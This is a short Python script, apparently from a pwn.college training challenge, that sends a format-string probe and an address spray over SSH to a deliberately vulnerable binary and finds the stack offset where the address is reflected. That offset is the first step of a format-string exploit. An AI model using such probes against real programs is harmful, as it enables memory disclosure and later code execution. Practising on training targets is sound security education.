import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

fmt = ("AAA " + "%p " * 80).encode()
spray = struct.pack("<Q", ADDR) * 32

res = subprocess.run(SSH, input=fmt + b"\x00" + spray, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")

for line in out.splitlines():
    if line.startswith("AAA "):
        tokens = line.split()[1:]
        for i, tok in enumerate(tokens, start=1):
            if tok.lower().startswith("0x4040e0"):
                print(i, tok)
        break
